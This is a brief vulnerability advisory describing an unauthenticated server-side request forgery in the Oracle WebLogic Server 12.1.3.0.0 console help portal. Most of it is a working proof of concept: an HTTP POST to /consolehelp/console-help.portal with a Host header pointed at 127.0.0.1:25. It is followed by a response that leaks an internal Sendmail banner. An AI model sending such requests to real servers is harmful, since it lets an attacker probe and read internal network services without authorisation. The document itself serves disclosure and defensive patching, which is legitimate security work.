# Unauthenticated SSRF in WebLogic Console Help

Product: Oracle WebLogic Server 12c
Version: 12.1.3.0.0

Oracle WebLogic Server in default installation with enabled console help portal is vulnerable to Server Side Request forgery.
Through a HTTP Host header injection contition an attacker is able to modify it to any address causing a server to issue a HTTP GET request to pointed IP and TCP port number. Response of malicious HTTP request contains an output of SSRF query, disclosing reply of forged request.

## PoC:

### REQ:

```
POST /consolehelp/console-help.portal HTTP/1.1
Host: 127.0.0.1:25
Content-Length: 6

aaaa
```

### RES:

```
HTTP/1.1 200 OK
Date: Mon, 15 Jul 2019 13:33:29 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Content-Language: en-US
Content-Length: 841585

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html lang="en-US"><head><meta http-equiv="Content-Script-Type" content="text/javascript"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>Oracle WebLogic Server Administration Console Help</title>
[...]
!-- Section 508: Skip repetitive links -->
<a name="mainContentStart" id="mainContentStart" tabindex="-1"></a>
<div>
220 xxxx.aaa.bbb.oraclevcn.com ESMTP Sendmail 8.14.4/8.14.4; Mon, 15 Jul 2019 13:33:29 GMT421 4.7.0 xxxx.aaa.bbb.oraclevcn.com Rejecting open proxy localhost [127.0.0.1]
</div>
[...]
```
